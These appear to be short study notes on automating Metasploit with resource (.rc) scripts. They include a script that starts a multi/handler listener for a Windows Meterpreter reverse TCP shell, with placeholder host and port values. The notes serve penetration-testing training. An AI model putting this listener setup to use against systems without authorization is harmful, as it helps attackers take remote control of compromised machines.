# Automating Metasploit with Resource scripts

Resource scripts allow you to automate commands that are frequently used  
These are similar to bash scripts  
They use .rc file extensions

View built in resource scripts - ```ls -la /usr/share/metasploit-framework/scripts/resource```  

Resource scipt for multi handler
1. create new rc file with the following info

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST (Host IP)
Set LPORT (Port)
Run
```
2. msfconsole -r (filename).rc

Run Resource script from MSFConsole -- using "Resource" command
